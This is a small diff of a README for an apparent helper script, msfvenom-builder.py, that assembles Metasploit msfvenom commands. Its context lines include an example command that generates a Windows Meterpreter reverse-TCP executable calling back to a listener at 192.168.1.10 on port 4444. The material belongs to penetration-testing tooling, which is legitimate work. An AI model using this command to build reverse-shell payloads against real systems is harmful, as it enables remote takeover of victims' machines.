@@ -24,7 +24,7 @@ Metasploit Framework installed (for using the generated command)
 Usage
 Interactive mode (recommended)
 python msfvenom-builder.py --interactive
-
+"
 CLI mode
 python msfvenom-builder.py \
   --platform windows \
@@ -34,6 +34,7 @@ python msfvenom-builder.py \
   --lport 4444 \
   --format exe \
   --output payload.exe
+  "
 
 Example Output
 msfvenom -p windows/x64/meterpreter/reverse_tcp ARCH=x64 LHOST=192.168.1.10 LPORT=4444 -f exe -o payload.exe
